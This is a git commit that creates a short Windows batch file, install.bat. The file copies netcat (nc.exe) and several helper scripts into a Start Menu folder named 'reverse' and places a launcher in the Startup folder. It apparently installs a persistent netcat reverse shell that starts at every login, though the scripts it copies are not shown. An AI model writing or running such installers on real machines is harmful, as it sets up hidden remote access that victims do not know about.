1e2fb22e1afe2de5b7faedd3e61fb6eb90ff961d
strongpapazola <48545591+strongpapazola@users.noreply.github.com>
2020-07-11 19:00:50 +0700

    Create install.bat

---
+++ install.bat
@@ -0,0 +1,5 @@
+mkdir C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse
+copy ./1.vbs C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\
+copy ./2.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\
+copy ./nc.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\
+copy ./start.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
